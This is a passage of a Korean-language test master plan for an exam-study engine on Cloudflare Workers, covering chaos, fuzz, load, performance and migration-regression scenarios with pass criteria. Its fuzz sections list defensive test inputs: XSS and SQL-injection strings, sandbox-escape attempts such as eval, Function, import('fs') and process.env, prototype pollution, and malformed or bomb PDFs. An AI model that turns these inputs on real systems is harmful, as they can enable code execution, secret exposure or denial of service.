# 🗡️ ThePick Engine Quality Test Master Plan v1.0

> **"셀프체크가 끝나는 곳에서, 진짜 테스트가 시작된다."**
>
> 작성일: 2026-05-01
> 작성자: Mephisto + DEV COVEN 7인
> 대상: ThePick Engine Hardening v1.0 (949 PASS 이후)
> 분량: 10 차원 / 50 시나리오 / SLO 207건

---

## 0. 도입 — 왜 셀프체크는 부족한가

### 0.1 셀프체크의 3가지 함정

```
함정 1: 테스트 작성자 = 코드 작성자
  → 작성자의 가정과 동일한 가정으로 테스트 = 같은 맹점 공유

함정 2: Happy path 편향
  → "잘 작동하는지" 검증, "언제 깨지는지" 미검증
  → 949 tests 중 fault injection은 AC-RP-3 (50% kill) 1건뿐

함정 3: 단일 시점 검증
  → "T=0 시점에 통과"만 증명, "T=24h 후" / "T=N일 후" 미검증
  → 메모리 누수, connection pool 고갈, telemetry 누적 등 시간 함수 미검증
```

### 0.2 본 계획의 작성 원칙

```
원칙 1: 외부 증거 100%
  → 모든 합격 판정은 측정 도구 출력 (JSON / log / 수치)으로 증명

원칙 2: 자동화 우선, 수동은 최후
  → 50 시나리오 중 ~70%는 CI 통합 가능. 나머지 30%는 매뉴얼 runbook으로 명문화

원칙 3: 합격/불합격 기준 사전 명시
  → 테스트 실행 후 "통과했다"가 아니라, "이 수치 < 이 SLO이므로 통과"

원칙 4: 시나리오 ID 부여
  → 결과 추적 가능. 실패 시 issue에 시나리오 ID 인용
```

### 0.3 10 차원 Test Framework

|         차원          | 코드 | 목적                     | 시나리오 수 | 자동화율 |
| :-------------------: | :--: | :----------------------- | :---------: | :------: |
|     1. **카오스**     | CHA  | 임의 장애 주입 시 회복성 |      6      |   100%   |
|      2. **퍼즈**      | FUZ  | 악의적/엣지 입력 견고성  |      6      |   100%   |
|      3. **부하**      | LOD  | 처리량 한계 측정         |      5      |   80%    |
|      4. **성능**      | PRF  | 지연/CPU 측정            |      6      |   100%   |
|      5. **회귀**      | REG  | 마이그레이션/버전 호환   |      5      |   90%    |
|  6. **시나리오 E2E**  | SCN  | 실사용자 플로우          |      6      |   60%    |
|      7. **침투**      | PEN  | 보안 공격면 검증         |      5      |   80%    |
|     8. **정밀도**     | PRC  | 수치 정확성              |      4      |   100%   |
| 9. **장기운영(Soak)** | SOK  | 시간 함수 안정성         |      3      |   50%    |
|   10. **리커버리**    | REC  | recovery 다변화          |      4      |   100%   |
|       **합계**        |  -   | -                        |   **50**    | **~85%** |

---

## 1. 카오스 차원 (CHA-XX) — Ghost + Breaker 주관

> _Ghost: "프로덕션은 우주야. 운석이 떨어진다고."_
> _Breaker: "운석은 못 막아. 운석 떨어졌을 때 죽는지 사는지를 알아야 해."_

### CoT 1.1: 카오스 시나리오 도출

```
[관찰] §10.4 AC-RP-3 = 50% kill 1개 시나리오 PASS
[관찰] 본 보고서 회복성 검증 = "결정적 fault 1건". 랜덤/다중/부분 fault 미검증.
[질문] Cloudflare Workers 환경에서 발생 가능한 장애 카테고리는?
[추론]
  (a) D1 disconnect (네트워크 단절)
  (b) D1 5xx (overload)
  (c) Worker CPU 50ms 초과 (timeout)
  (d) Workers Storage 쓰기 실패
  (e) Anthropic API 4xx/5xx
  (f) Vectorize timeout
  (g) Wall clock skew (NTP 동기화 실패)
  (h) Cron Trigger 미실행
[결론] 최소 8개 카테고리 × 다양한 발생 시점 = 폭발적 조합. 6개 핵심 시나리오로 압축.
```

---

### **CHA-01 — D1 무작위 disconnect (10% rate)**

| 항목            | 내용                                                                                                                       |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | BATCH 실행 중 D1 호출 10%가 실패할 때 retry 로직과 checkpoint 보존 검증                                                    |
| **시나리오**    | 1) BATCH-1 fixture 실행 / 2) MSW로 D1 binding fetch 가로채서 10% 무작위 503 반환 / 3) BATCH 완료까지 대기                  |
| **입력**        | seed=42 PRNG 기반 503 주입, 100회 D1 호출 중 10건                                                                          |
| **측정 도구**   | Vitest + MSW + Workers Vitest Pool, `engine_telemetry` `d1_slo` 게이지                                                     |
| **합격 기준**   | (a) BATCH 최종 status='completed' / (b) p95 latency ≤ 2,000ms / (c) 각 호출 retry ≤ 3회 / (d) checkpoint 파일 corruption=0 |
| **불합격 분류** | Critical: BATCH 실패 / Major: latency 초과 / Minor: retry 횟수 초과                                                        |
| **자동화**      | ✅ Vitest                                                                                                                  |
| **선행 조건**   | apps/batch wire-up 완료 (현 deferred)                                                                                      |

### **CHA-02 — Worker CPU 50ms 초과 시뮬레이션**

| 항목            | 내용                                                                                                                           |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | Formula Engine이 의도적으로 무거운 산식(중첩 수학)을 받았을 때 50ms 한도 초과 시 graceful 처리                                 |
| **시나리오**    | 1) `math.parse()` 가 10,000 노드 깊이 AST를 생성하는 산식 입력 / 2) `engine.calculate()` 호출 / 3) `setTimeout(50)` 시뮬레이션 |
| **입력**        | "1+1+1+...+1" (1000회 반복) + 중첩 함수 `sin(cos(tan(...)))` 50중첩                                                            |
| **측정 도구**   | Vitest + `performance.now()`                                                                                                   |
| **합격 기준**   | (a) `CalculationTimeoutError` throw / (b) error.code='COMPUTE_TIMEOUT' / (c) 메모리 누수=0 (3회 반복 후 heap delta < 1MB)      |
| **불합격 분류** | Critical: 무한 루프 / Major: silent fail / Minor: 잘못된 에러 코드                                                             |
| **자동화**      | ✅ Vitest                                                                                                                      |

### **CHA-03 — Anthropic API 5xx 폭주**

| 항목            | 내용                                                                                                                                                                 |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | Layer 2 cap 발동 시뮬레이션. Anthropic SDK가 연속 5xx를 반환할 때 ai-adapter retry + cost-meter 연동                                                                 |
| **시나리오**    | 1) MSW로 `api.anthropic.com/v1/messages` 100% 503 반환 / 2) parser.batch_structurize 호출 / 3) ai-adapter retry 동작 관찰                                            |
| **입력**        | 503 × 5회 연속, 그 후 200 정상 응답                                                                                                                                  |
| **측정 도구**   | Vitest + MSW + cost-meter 로그                                                                                                                                       |
| **합격 기준**   | (a) 5회 retry 후 6번째 시도 / (b) exponential backoff 적용 (1s, 2s, 4s, 8s, 16s) / (c) cost-meter status 변경 (soft_warn 발동 가능) / (d) 최종 200 응답 시 정상 진행 |
| **불합격 분류** | Critical: 무한 retry / Major: linear backoff / Minor: 로깅 누락                                                                                                      |
| **자동화**      | ✅ Vitest                                                                                                                                                            |

### **CHA-04 — Wall clock skew (시계 ±10분)**

| 항목            | 내용                                                                                                                                     |
| :-------------- | :--------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | 서버 클럭이 ±10분 어긋났을 때 batch_runs state machine + checkpoint timestamp 정합성                                                     |
| **시나리오**    | 1) `Date.now()` mock으로 +10분 future / 2) BATCH 실행 / 3) 다시 정상 시계 / 4) recover 시도                                              |
| **입력**        | T=0에 BATCH 시작, T=600s에 시계 -10분 점프, T=900s에 정상                                                                                |
| **측정 도구**   | Vitest + sinon.useFakeTimers                                                                                                             |
| **합격 기준**   | (a) batch_runs.elapsed 음수 시 abs() 처리 / (b) recover.ts Q1 "elapsed < 24h" 가드 통과 / (c) checkpoint timestamp가 미래라도 거부 안 함 |
| **불합격 분류** | Critical: BATCH 좀비 상태 / Major: recover 거부                                                                                          |
| **자동화**      | ✅ Vitest                                                                                                                                |

### **CHA-05 — Vectorize timeout 진입**

| 항목            | 내용                                                                                                                            |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------ |
| **목적**        | ADR-008 Graceful Degradation. Vectorize 검색이 타임아웃되면 키워드 fallback 동작 검증                                           |
| **시나리오**    | 1) Vectorize binding mock으로 5초 hang / 2) hybrid search 호출 / 3) fallback 트리거 검증                                        |
| **측정 도구**   | Vitest + Workers Vitest Pool                                                                                                    |
| **합격 기준**   | (a) 2초 timeout 발동 / (b) `SearchFallbackEvent` emit / (c) 키워드 검색 결과 반환 / (d) similarity < 0.60 케이스에서도 fallback |
| **불합격 분류** | Critical: hang 유지 / Major: fallback 미동작                                                                                    |
| **자동화**      | ✅ Vitest                                                                                                                       |

### **CHA-06 — Cron Trigger 24시간 미실행**

| 항목            | 내용                                                                                                         |
| :-------------- | :----------------------------------------------------------------------------------------------------------- |
| **목적**        | Cron이 실패해도 rate_limits 누적 / telemetry 손실 / engine_telemetry 1년 보존 정책 영향 검증                 |
| **시나리오**    | 1) Cron 24h 미발화 시뮬레이션 / 2) rate_limits row 폭증 (10K row) / 3) 다음 Cron 정상 발화 / 4) GC 동작 확인 |
| **측정 도구**   | Vitest + 수동 wrangler triggers cron                                                                         |
| **합격 기준**   | (a) GC 1회 실행으로 stale row 100% 제거 / (b) D1 쿼리 latency 변화 측정 / (c) 알람 발동 (Phase 2)            |
| **불합격 분류** | Major: GC 미동작 / Minor: 알람 누락                                                                          |
| **자동화**      | 🟡 부분 (Cron 시뮬레이션은 수동)                                                                             |

---

## 2. 퍼즈 차원 (FUZ-XX) — Breaker 주관

> _Breaker: "사용자가 여기에 이모지 넣으면? Claude가 여기에 NaN 넣으면? PDF에 백도어 넣으면?"_

### CoT 2.1: 퍼즈 입력면 매핑

```
[입력면 1] PDF (외부 입력) → pdfplumber subprocess
[입력면 2] Claude API 응답 → parser → KnowledgeContract
[입력면 3] Webhook 페이로드 → /api/webhooks/payment/*
[입력면 4] 사용자 입력 → /api/auth/* + /api/progress/*
[입력면 5] 산식 텍스트 → math.js parse
[입력면 6] examId → 모든 데이터 함수 첫 인자

[질문] 각 입력면에 악의적/엣지 입력을 던지면?
[추론] PDF는 binary blob = 광범위 fuzz 영역. Claude 응답은 JSON Zod validation 1차 방어.
       Webhook은 HMAC 1차 방어. 산식은 sandbox 1차 방어.
       그러나 1차 방어 우회 케이스가 fuzz의 핵심.
```

---

### **FUZ-01 — 악의적 PDF (구조 깨짐)**

| 항목            | 내용                                                                                                                               |
| :-------------- | :--------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | 손상된/악의적 PDF 입력 시 pdfplumber subprocess crash → BATCH 안전 종료                                                            |
| **시나리오**    | 5종 PDF 던짐: (1) 0바이트 빈 파일 (2) `%PDF` 헤더만 (3) 무한 압축 폭탄 (4) malformed xref (5) 1MB JS embedded PDF                  |
| **측정 도구**   | Vitest + pdf-fixtures/                                                                                                             |
| **합격 기준**   | (a) 모든 케이스 `PdfParseError` throw / (b) subprocess zombie 0건 / (c) BATCH status='failed' 명시 (좀비 아님) / (d) 메모리 leak 0 |
| **불합격 분류** | Critical: subprocess 좀비 / Major: silent fail                                                                                     |
| **자동화**      | ✅ Vitest                                                                                                                          |

### **FUZ-02 — Claude 변조 응답 (JSON 깨짐)**

| 항목            | 내용                                                                                                                                                                                                                                                |
| :-------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | Claude가 의도와 다른 응답 반환 시 schema-validator + ontology-registry 방어                                                                                                                                                                         |
| **시나리오**    | 8종 응답: (1) 빈 JSON `{}` (2) JSON parse 에러 `{broken` (3) 노드 ID에 `"<script>"` 포함 (4) examId 누락 (5) ontology 미등록 노드 type (6) 깊이 100 nested edges (7) 100MB 거대 응답 (8) Hard Rule 17 위반 (`'son-hae-pyeong-ga-sa'` 리터럴 임베딩) |
| **측정 도구**   | Vitest + parser.schema-validator                                                                                                                                                                                                                    |
| **합격 기준**   | (a) 8/8 모두 `KnowledgeContractValidationError` / (b) error.code 분류 정확 (`SCHEMA_INVALID` / `ONTOLOGY_VIOLATION` / `EXAM_ID_VIOLATION`) / (c) draft-loader INSERT 호출 0건 / (d) PII Masking 발동 (XSS 패턴 자동 마스킹 검증)                    |
| **불합격 분류** | Critical: validation bypass / Major: 잘못된 분류                                                                                                                                                                                                    |
| **자동화**      | ✅ Vitest                                                                                                                                                                                                                                           |

### **FUZ-03 — Webhook 페이로드 폭탄**

| 항목            | 내용                                                                                                                                                                              |
| :-------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | HMAC + IP allowlist 통과한 페이로드의 입력 검증                                                                                                                                   |
| **시나리오**    | 5종: (1) HMAC 정상 + 페이로드 100MB (2) HMAC 정상 + JSON 깊이 1000 (3) provider="<script>alert(1)</script>" (4) order_id에 SQL injection (5) 동일 idempotency_key로 100 동시 요청 |
| **측정 도구**   | Playwright + apps/api e2e                                                                                                                                                         |
| **합격 기준**   | (a) Body size limit 1MB enforcement → 413 / (b) JSON depth limit → 422 / (c) Drizzle prepared statement = SQL injection 차단 / (d) idempotency 100건 중 1건만 처리                |
| **불합격 분류** | Critical: SQL injection 통과 / Major: idempotency 깨짐                                                                                                                            |
| **자동화**      | ✅ Playwright                                                                                                                                                                     |

### **FUZ-04 — 산식 sandbox 우회 시도**

| 항목            | 내용                                                                                                                                                                                                                                                                             |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | math.js AST sandbox가 차단한다고 주장하는 위험 노드 12종 외부 vector 발견 시도                                                                                                                                                                                                   |
| **시나리오**    | 12종 시도: (1) `Function('return 1')()` (2) `eval('1+1')` (3) `setTimeout` (4) `import('fs')` (5) `process.env` (6) `globalThis` (7) `__proto__` 조작 (8) circular reference (9) `Symbol.iterator` 오버라이드 (10) BigInt 폭탄 `2n**1000n` (11) Promise resolve (12) Reflect API |
| **측정 도구**   | Vitest + formula-engine.sandbox                                                                                                                                                                                                                                                  |
| **합격 기준**   | (a) 12/12 모두 `SandboxViolationError` / (b) 실제 함수 실행 0건 (sentinel: global counter mutation 안 됨)                                                                                                                                                                        |
| **불합격 분류** | Critical: 1건이라도 실행                                                                                                                                                                                                                                                         |
| **자동화**      | ✅ Vitest                                                                                                                                                                                                                                                                        |

### **FUZ-05 — examId 변조 시도**

| 항목            | 내용                                                                                                                                                                                                                                        |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **목적**        | Hard Rule 17 EXAM_IDS 단일 출처 우회 시도                                                                                                                                                                                                   |
| **시나리오**    | 8종: (1) 정상 'son-hae-pyeong-ga-sa' (2) 대문자 (3) trailing space (4) URL encoded (5) Unicode 변형 (6) `'son-hae-pyeong-ga-sa\0'` (7) prototype pollution `{__proto__: 'son-hae-pyeong-ga-sa'}` (8) Year 2 미등록 ID 'gong-in-jung-gae-sa' |
| **측정 도구**   | Vitest + assertValidExamId                                                                                                                                                                                                                  |
| **합격 기준**   | (a) 1/8만 통과 (정상 케이스) / (b) 7/8 모두 `InvalidExamIdError` / (c) error에 입력값 leak 안 함 (PII Masking)                                                                                                                              |
| **불합격 분류** | Critical: 변형 통과                                                                                                                                                                                                                         |
| **자동화**      | ✅ Vitest                                                                                                                                                                                                                                   |

### **FUZ-06 — 한글/Unicode 폭탄**

| 항목            | 내용                                                                                                                                        |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------ |
| **목적**        | 손해평가사 시험은 한글 콘텐츠. 다양한 Unicode 케이스 처리                                                                                   |
| **시나리오**    | 6종: (1) 한자 (傷害評價士) (2) 한글 자모 분리 (ㅎㅏㄴ) (3) zero-width joiner (4) RTL override (5) 이모지 surrogate pair (6) 4MB 한글 텍스트 |
| **측정 도구**   | Vitest + parser.normalizer                                                                                                                  |
| **합격 기준**   | (a) NFC 정규화 일관 / (b) byte length 정확 / (c) D1 INSERT 후 round-trip 일치 / (d) length validation = grapheme 단위                       |
| **불합격 분류** | Major: 한자 처리 누락 / Minor: 이모지 길이 오산                                                                                             |
| **자동화**      | ✅ Vitest                                                                                                                                   |

---

## 3. 부하 차원 (LOD-XX) — Ghost + Architect 주관

> _Ghost: "10K 사용자에서 뭐가 터지나?"_

### CoT 3.1: 부하 시나리오 압축

```
[제약] 본 시점 = Phase 1 closeout. 사용자 0명. 부하 테스트 = 합성(synthetic).
[원칙] 합성 부하 도구 = k6 / wrk / Artillery. Cloudflare Workers는 unbounded scale.
       그러나 D1 = SQLite. write contention 위험.
[목표 SLO] 메모리 project_vision_mvp_generalization → 100명 베타 + 1K 사용자 1년차 가능성
[질문] Phase 2 진입 시 가장 먼저 폭발할 자원은?
[추론] D1 동시 쓰기 (특히 user_progress UPSERT). 1K 사용자 동시 학습 = 분당 ~5K UPSERT.
```

---

### **LOD-01 — 동시 BATCH 100건 시도**

| 항목            | 내용                                                                                                                                               |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | ADR-027 Atomic BATCH + Hard Rule 7 (BATCH 순차 실행) 강제 검증                                                                                     |
| **시나리오**    | k6로 동일 batch_run_id 100건 동시 trigger / `recover.ts` concurrent_run_detected 가드 발동 횟수 측정                                               |
| **측정 도구**   | k6 + apps/batch entry point                                                                                                                        |
| **합격 기준**   | (a) 1건 in_progress + 99건 concurrent_run_detected / (b) 동일 결과 (invariant_fields 동일) / (c) D1 lock contention 0건 (batch_runs 트리거가 차단) |
| **불합격 분류** | Critical: 2건 이상 동시 실행                                                                                                                       |
| **자동화**      | ✅ k6 (CI 통합 가능)                                                                                                                               |

### **LOD-02 — 1K 동시 사용자 progress UPSERT**

| 항목            | 내용                                                                                                                             |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | user_progress UPSERT 동시성 + D1 throughput                                                                                      |
| **시나리오**    | k6 → 1,000 가상 사용자 → 각 분당 5회 review POST → 60초 sustain                                                                  |
| **측정 도구**   | k6 + apps/api `/api/progress/review`                                                                                             |
| **합격 기준**   | (a) p95 < 200ms / (b) p99 < 500ms / (c) 5xx rate < 0.1% / (d) D1 connection pool 고갈 0건 / (e) total UPSERT = 300,000 (loss 0%) |
| **불합격 분류** | Critical: 5xx > 1% / Major: latency 초과                                                                                         |
| **자동화**      | 🟡 k6 (수동 트리거, 비용 발생)                                                                                                   |

### **LOD-03 — Telemetry write 폭주**

| 항목            | 내용                                                                                                      |
| :-------------- | :-------------------------------------------------------------------------------------------------------- |
| **목적**        | engine_telemetry append-only 테이블의 write 한계 + 인덱스 비대화                                          |
| **시나리오**    | 분당 600건 telemetry POST × 1시간 = 36,000건                                                              |
| **측정 도구**   | wrangler tail + D1 쿼리 EXPLAIN                                                                           |
| **합격 기준**   | (a) 모든 write 성공 / (b) 인덱스 3종 사용률 측정 / (c) `gauges/:name` GET p95 < 100ms (last 100 row 조회) |
| **불합격 분류** | Major: write loss / Minor: 인덱스 미사용                                                                  |
| **자동화**      | ✅ k6                                                                                                     |

### **LOD-04 — Vectorize 검색 RPS 한계**

| 항목            | 내용                                                                                                    |
| :-------------- | :------------------------------------------------------------------------------------------------------ |
| **목적**        | hybrid search RPS 한계 + Graceful Degradation 발동 임계점                                               |
| **시나리오**    | 100 RPS → 500 RPS → 1000 RPS 점진 증가                                                                  |
| **측정 도구**   | k6 + Vectorize binding                                                                                  |
| **합격 기준**   | (a) 100 RPS p95 < 200ms / (b) 500 RPS 에서 fallback 발동률 측정 / (c) 1000 RPS 에서 fallback rate < 30% |
| **불합격 분류** | Major: 100 RPS p95 > 500ms                                                                              |
| **자동화**      | 🟡 k6 (Phase 1 후반 wire-up 후)                                                                         |

### **LOD-05 — checkpoint 파일 크기 폭증**

| 항목            | 내용                                                                                     |
| :-------------- | :--------------------------------------------------------------------------------------- |
| **목적**        | BATCH-1 적재 후 checkpoint 파일 크기 추정 + recover 시 SHA-256 검증 시간                 |
| **시나리오**    | fixture로 노드 5,000 / 엣지 20,000 BATCH 실행 → checkpoint 크기 측정 → recover 시간 측정 |
| **측정 도구**   | apps/batch checkpoint.ts + `performance.now()`                                           |
| **합격 기준**   | (a) checkpoint 크기 < 50MB / (b) SHA-256 검증 < 2초 / (c) recover 전체 < 10초            |
| **불합격 분류** | Major: 검증 시간 > 5초 (Worker timeout 위험)                                             |
| **자동화**      | ✅ Vitest                                                                                |

---

## 4. 성능 차원 (PRF-XX) — Hacker + Architect 주관

> _Hacker: "Cat 5 deferred? 그럼 지금 측정해서 baseline 잡자."_

### CoT 4.1: 성능 측정의 본 시점 가능성

```
[관찰] §2.3 Cat 5 성능 = "LLM 통합 후 deferred"
[반박] LLM 통합 없이도 측정 가능한 영역 다수:
  (a) Formula Engine 51 산식 처리 속도
  (b) Parser normalizer 결정성 처리 시간
  (c) Quality SCC 알고리즘 (naive DFS vs Tarjan 비교)
  (d) D1 쿼리 EXPLAIN 분석
  (e) Workers cold start 시간
  (f) checkpoint SHA-256 시간
[결론] Cat 5 deferred는 "LLM 통합 후"가 아니라 "측정 자원 부족"을 가리는 라벨일 가능성.
       6개 시나리오는 본 시점 즉시 측정 가능.
```

---

### **PRF-01 — Formula Engine 51 산식 처리 속도**

| 항목            | 내용                                                                                                 |
| :-------------- | :--------------------------------------------------------------------------------------------------- |
| **목적**        | Workers 50ms CPU 한도 대비 산식 51개 일괄 처리 baseline                                              |
| **시나리오**    | 51개 산식 × 5 시나리오 = 255건 calculate() 호출 / 3회 반복 측정 / median                             |
| **측정 도구**   | Vitest + `performance.now()`                                                                         |
| **합격 기준**   | (a) 단일 calculate p99 < 5ms / (b) 51개 직렬 처리 < 100ms / (c) AST cache hit rate > 90% (반복 호출) |
| **불합격 분류** | Critical: 단일 > 50ms / Major: cache miss > 30%                                                      |
| **자동화**      | ✅ Vitest                                                                                            |

### **PRF-02 — naive DFS vs Tarjan SCC 비교 (BREAKER 핵심)**

| 항목            | 내용                                                                                                                                                                  |
| :-------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | §3.2.3 naive DFS의 임계 노드 수 = Tarjan 도입 트리거 결정                                                                                                             |
| **시나리오**    | 합성 그래프 N=100 / 1,000 / 5,000 / 10,000 / 50,000 노드 × E=4×N 엣지 / 두 알고리즘 모두 실행                                                                         |
| **측정 도구**   | Vitest + `performance.now()`                                                                                                                                          |
| **합격 기준**   | (a) N=5,000에서 naive DFS < 30ms / (b) N=10,000에서 < 100ms (Worker timeout 위험) / (c) Tarjan은 N=50,000에서도 < 500ms / (d) **두 알고리즘 결과 100% 일치** (sanity) |
| **불합격 분류** | **Critical: N=BATCH-1 추정 노드 수에서 naive > 50ms (Tarjan 즉시 도입 트리거)**                                                                                       |
| **자동화**      | ✅ Vitest                                                                                                                                                             |

### **PRF-03 — D1 복합 쿼리 EXPLAIN 분석**

| 항목            | 내용                                                                                                      |
| :-------------- | :-------------------------------------------------------------------------------------------------------- |
| **목적**        | 복합 인덱스 적중률 (특히 batch_runs / engine_telemetry)                                                   |
| **시나리오**    | 핵심 5개 쿼리 EXPLAIN QUERY PLAN 실행                                                                     |
| **측정 도구**   | wrangler d1 execute --command "EXPLAIN ..."                                                               |
| **합격 기준**   | (a) 모든 쿼리 SCAN TABLE 0건 (USE INDEX 100%) / (b) 복합 인덱스 prefix 일치 / (c) 실제 latency p95 < 50ms |
| **불합격 분류** | Major: 1건이라도 SCAN TABLE                                                                               |
| **자동화**      | ✅ wrangler script                                                                                        |

### **PRF-04 — checkpoint SHA-256 시간**

| 항목            | 내용                                                                                        |
| :-------------- | :------------------------------------------------------------------------------------------ |
| **목적**        | LOD-05와 별도. 다양한 파일 크기에서 SHA-256 시간                                            |
| **시나리오**    | 1MB / 10MB / 50MB / 100MB checkpoint × 100회 hash                                           |
| **측정 도구**   | Vitest + Web Crypto API                                                                     |
| **합격 기준**   | (a) 50MB < 1초 / (b) 100MB < 3초 / (c) Worker timeout (50ms CPU)에서 분할 처리 필요 시 명시 |
| **불합격 분류** | Major: 50MB > 5초                                                                           |
| **자동화**      | ✅ Vitest                                                                                   |

### **PRF-05 — Workers cold start 시간**

| 항목            | 내용                                                                         |
| :-------------- | :--------------------------------------------------------------------------- |
| **목적**        | apps/api / apps/batch 의 cold start 영향 측정                                |
| **시나리오**    | 30분 idle 후 첫 요청 × 20회                                                  |
| **측정 도구**   | wrangler tail + 헤더 `cf-ray`                                                |
| **합격 기준**   | (a) cold start p95 < 500ms / (b) warm p95 < 50ms / (c) cold/warm ratio < 10x |
| **불합격 분류** | Major: cold > 1초                                                            |
| **자동화**      | 🟡 부분 (production 측정)                                                    |

### **PRF-06 — parser normalizer 처리 시간**

| 항목            | 내용                                                                                         |
| :-------------- | :------------------------------------------------------------------------------------------- |
| **목적**        | KnowledgeContract 정규화 (sort/dedupe/canonical key) 시간                                    |
| **시나리오**    | 노드 1,000 / 10,000 / 100,000 normalize() 호출                                               |
| **측정 도구**   | Vitest + `performance.now()`                                                                 |
| **합격 기준**   | (a) 1K < 10ms / (b) 10K < 100ms / (c) 100K < 1초 / (d) 결정성 검증 (3회 반복 invariant 동일) |
| **불합격 분류** | Major: 10K > 500ms                                                                           |
| **자동화**      | ✅ Vitest                                                                                    |

---

## 5. 회귀 차원 (REG-XX) — Architect 주관

> _Architect: "오늘의 결정이 1년 후 어떤 빚이 될지 예측한다."_

### CoT 5.1: 회귀 차원의 우선순위

```
[관찰] 17 마이그레이션 적용 = production 환경 미적용 (§11.2 절차 3번)
[관찰] engine_version major bump 시나리오 §5.6.2 Q3에 명시되었지만 테스트 부재
[관찰] Year 2 zero-cost 약속 = 시그니처 레벨만 검증
[질문] 회귀 위험이 가장 큰 영역은?
[추론]
  (a) 마이그레이션 적용 후 기존 BATCH-0 fixture 재실행 결과 동일성
  (b) engine_version major bump 시 recover 거부 시나리오
  (c) 17개 마이그레이션의 down 마이그레이션 (롤백) 검증
  (d) Year 2 마이그레이션 0005 추가 시 PK / 인덱스 / 온톨로지 / Vectorize 4-레벨 호환성
```

---

### **REG-01 — BATCH-0 fixture 재실행 invariant 일치**

| 항목            | 내용                                                                                                                         |
| :-------------- | :--------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | 17 마이그레이션 적용 후 기존 BATCH-0 fixture 결과가 동일한지 (reproducibility 회귀)                                          |
| **시나리오**    | 1) BATCH-0 fixture 실행 (T=0, 마이그레이션 0017까지 적용) / 2) D1 reset / 3) 재실행 / 4) invariant_fields 비교               |
| **측정 도구**   | Vitest + AC-RP-1 확장                                                                                                        |
| **합격 기준**   | (a) invariant_fields 100% 일치 / (b) 노드/엣지 count 동일 / (c) constants seed 동일 / (d) telemetry write 시점 동일 (±100ms) |
| **불합격 분류** | Critical: invariant 불일치                                                                                                   |
| **자동화**      | ✅ Vitest                                                                                                                    |

### **REG-02 — engine_version major bump 시나리오**

| 항목            | 내용                                                                                                                                             |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | §5.6.2 Q3 VersionMismatch 분기 e2e 검증                                                                                                          |
| **시나리오**    | 1) v2.0.0 BATCH 실행 / 2) 50% kill / 3) 코드 v3.0.0 변경 시뮬레이션 / 4) recover 시도                                                            |
| **측정 도구**   | Vitest + checkpoint manipulation                                                                                                                 |
| **합격 기준**   | (a) recover 거부 (`recovery_failed` + `VersionMismatch`) / (b) 진산님 manual 처리 runbook 참조 명시 / (c) BATCH status='failed' 명시 (좀비 아님) |
| **불합격 분류** | Critical: recover 강행 (데이터 corruption)                                                                                                       |
| **자동화**      | ✅ Vitest                                                                                                                                        |

### **REG-03 — 마이그레이션 down (롤백) 검증**

| 항목            | 내용                                                                                                                       |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | wrangler migrations 롤백 가능성. 본 시점 down 마이그레이션 부재일 수 있음                                                  |
| **시나리오**    | 0017 → 0016 → 0015 → ... → 0001 역방향 롤백 / 데이터 손실 측정                                                             |
| **측정 도구**   | wrangler d1 execute + 수동 SQL                                                                                             |
| **합격 기준**   | (a) 롤백 가능 / (b) 데이터 손실 측정값 명시 (예: 0017 down = engine_telemetry DROP, 데이터 100% 손실) / (c) runbook에 명시 |
| **불합격 분류** | Major: 롤백 불가 + runbook 부재                                                                                            |
| **자동화**      | 🟡 부분 (수동 SQL)                                                                                                         |

### **REG-04 — Year 2 마이그레이션 시뮬레이션**

| 항목            | 내용                                                                                                                                                                                      |
| :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | Year 2 zero-cost 약속의 4-레벨 검증                                                                                                                                                       |
| **시나리오**    | 1) 가상 마이그레이션 0005 작성 (gong-in-jung-gae-sa 추가) / 2) 기존 코드 변경 0건 검증 / 3) 새 examId로 BATCH 실행 / 4) 기존 examId 격리 검증                                             |
| **측정 도구**   | Vitest + assertValidExamId 확장                                                                                                                                                           |
| **합격 기준**   | (a) ontology-registry.json 수정 0건 (새 examId만 추가) / (b) 모든 데이터 함수 시그니처 변경 0건 / (c) 인덱스 prefix 호환 / (d) Vectorize 메타데이터 호환 / (e) cross-tenant 격리 (SF-M-2) |
| **불합격 분류** | **Critical: 1개 레벨이라도 코드 수정 필요 = zero-cost 약속 깨짐**                                                                                                                         |
| **자동화**      | ✅ Vitest (가상 마이그레이션)                                                                                                                                                             |

### **REG-05 — 1차 시험 vs Year 2 격리**

| 항목            | 내용                                                                        |
| :-------------- | :-------------------------------------------------------------------------- |
| **목적**        | parser-1st-exam 패키지 (Hard Rule 15 예외)의 Year 2 격리 검증               |
| **시나리오**    | parser-1st-exam이 손해평가사 1차 전용. gong-in-jung-gae-sa 적용 시도 → 거부 |
| **측정 도구**   | Vitest + parser-1st-exam exports                                            |
| **합격 기준**   | (a) examId 화이트리스트 검증 / (b) 거부 시 명확한 에러 메시지               |
| **불합격 분류** | Major: 미등록 examId 통과                                                   |
| **자동화**      | ✅ Vitest                                                                   |

---

## 6. 시나리오 E2E 차원 (SCN-XX) — Advocate + Oracle 주관

> _Advocate: "엄마가 이걸 쓸 수 있어? 처음부터 끝까지 1번도 안 막혀?"_

### CoT 6.1: 시나리오 도출 — 진짜 사용자 여정

```
[정의] E2E = 실사용자가 한 번에 경험하는 전체 플로우
[메모리] project_vision_mvp_generalization = 합격률 60%
[추론] 합격생을 만드는 풀 플로우:
